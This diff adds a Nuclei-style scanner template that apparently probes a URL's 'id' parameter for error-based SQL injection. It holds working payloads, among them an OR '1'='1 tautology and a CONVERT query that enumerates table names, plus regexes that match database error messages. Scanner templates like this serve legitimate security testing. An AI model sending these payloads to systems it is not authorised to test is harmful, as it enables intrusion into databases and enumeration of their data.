@@ -1,0 +1,42 @@
+id: m7-sqli-error-based
+info:
+  name: M7 - SQL Injection Error-Based Detection
+  author: Sharlix
+  severity: critical
+  description: Error-based SQLi detection using database error messages as proof
+  tags: sqli,error,m7hunter
+  reference:
+    - https://portswigger.net/web-security/sql-injection
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?id=1'"
+      - "{{BaseURL}}?id=1""
+      - "{{BaseURL}}?id=1`"
+      - "{{BaseURL}}?id=1\'"
+      - "{{BaseURL}}?id=1%27"
+      - "{{BaseURL}}?id=1' OR '1'='1"
+      - "{{BaseURL}}?id=1' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--"
+
+    matchers-condition: or
+    matchers:
+      - type: regex
+        regex:
+          - "SQL syntax.*MySQL"
+          - "Warning.*mysql_"
+          - "MySQLSyntaxErrorException"
+          - "valid MySQL result"
+          - "check the manual that (corresponds to|fits) your MySQL"
+          - "ORA-[0-9]{4,5}:"
+          - "PostgreSQL.*ERROR"
+          - "PG::SyntaxError"
+          - "SQLite3::Exception"
+          - "Microsoft.*ODBC.*SQL"
+          - "Unclosed quotation mark"
+          - "Driver.*SQL[-_ ]*Server"
+          - "SQLSTATE\["
+          - "Incorrect syntax near"
+          - "jdbc\.mysql"
+        part: body
+        condition: or
